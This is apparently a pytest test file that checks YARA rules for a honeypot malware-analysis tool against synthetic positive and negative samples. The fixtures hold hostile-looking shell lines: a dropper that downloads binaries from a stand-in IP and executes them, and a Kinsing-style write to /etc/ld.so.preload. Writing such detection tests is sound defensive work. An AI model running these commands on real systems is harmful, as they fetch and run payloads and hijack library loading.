"""Every shipped rule compiles, matches its synthetic positive, and no synthetic negative."""

from __future__ import annotations

from pathlib import Path

import pytest

from suckerpot_analysis import CompiledRules, Limits, analyze, compile_rules

from .conftest import RULES_DIR, make_elf

MIRAI = make_elf(machine=40, bits=32, body=b"\x00/bin/busybox ECCHI\x00/dev/watchdog\x00")
GAFGYT = make_elf(machine=8, bits=32, little=False, body=b"\x00LOLNOGTFO\x00KILLATTK\x00")
MINER = b'{"url": "stratum+tcp://pool.example.com:3333", "algo": "rx/0"} xmrig --donate-level=1'
REDIS = make_elf(body=b"\x00RedisModule_OnLoad\x00system.exec\x00")
DROPPER = (
    b"#!/bin/sh\ncd /tmp\n"
    b"wget http://192.0.2.9/bins/mips -O m; wget http://192.0.2.9/bins/arm7 -O a\n"
    b"chmod 777 m a; ./m; ./a; rm -rf m a\n"
)
KINSING = b"#!/bin/sh\npkill kdevtmpfsi; echo kinsing >> /etc/ld.so.preload\n"

POSITIVES = {
    "mirai_elf": MIRAI,
    "gafgyt_elf": GAFGYT,
    "crypto_miner_xmrig": MINER,
    "redis_rogue_module": REDIS,
    "shell_dropper_multiarch": DROPPER,
    "kinsing_loader": KINSING,
}

NEGATIVES = [
    make_elf(body=b"\x00/bin/busybox\x00hello\x00"),  # busybox alone
    make_elf(body=b"\x00RedisModule_OnLoad\x00hello\x00"),  # a harmless module
    make_elf(machine=8, bits=32, body=b"\x00PING\x00PONG!\x00HOLD\x00"),
    b"#!/bin/sh\necho hello\nwget http://192.0.2.9/readme.txt -O r\n",
    b"My blog about monero and mining in general, no config.",
    b"#!/bin/sh\ncat /etc/ld.so.preload\n",
    b"plain text " * 100,
    bytes(range(256)) * 64,
    b"",
]


def test_every_rule_file_compiles() -> None:
    compiled = compile_rules(RULES_DIR)
    assert set(compiled.files) == {
        "mirai.yar",
        "gafgyt.yar",
        "miners.yar",
        "redis_module.yar",
        "shell_dropper.yar",
        "kinsing.yar",
    }


@pytest.mark.parametrize(("rule", "sample"), POSITIVES.items())
def test_positive(rules: CompiledRules, rule: str, sample: bytes) -> None:
    result = analyze(sample, rules=rules)
    assert rule in {h.rule for h in result.yara}
    hit = next(h for h in result.yara if h.rule == rule)
    assert {"author", "description", "reference", "family", "severity"} <= set(hit.meta)
    assert result.family == hit.meta["family"]


@pytest.mark.parametrize("sample", NEGATIVES)
def test_negatives_match_nothing(rules: CompiledRules, sample: bytes) -> None:
    assert analyze(sample, rules=rules).yara == []


def test_each_rule_matches_only_its_own_positive(rules: CompiledRules) -> None:
    for rule, sample in POSITIVES.items():
        names = {h.rule for h in analyze(sample, rules=rules).yara}
        assert rule in names
        if rule not in {"kinsing_loader", "shell_dropper_multiarch"}:
            assert names == {rule}


def test_severity_and_tags_come_from_rules(rules: CompiledRules) -> None:
    assert analyze(MINER, rules=rules).severity == "warning"
    assert analyze(MIRAI, rules=rules).severity == "severe"


def test_broken_rule_fails_compilation(tmp_path: Path) -> None:
    (tmp_path / "bad.yar").write_text("rule x { condition: $undefined }")
    with pytest.raises(Exception, match=r"."):
        compile_rules(tmp_path)


def test_yara_timeout_is_reported_not_raised(tmp_path: Path) -> None:
    (tmp_path / "slow.yar").write_text("rule slow { strings: $a = /a.*b.*c.*d/ condition: $a }\n")
    slow = compile_rules(tmp_path)
    result = analyze(b"a" * 2_000_000, rules=slow, limits=Limits(yara_timeout_s=1))
    assert result.yara == [] or result.errors == []  # returns without raising
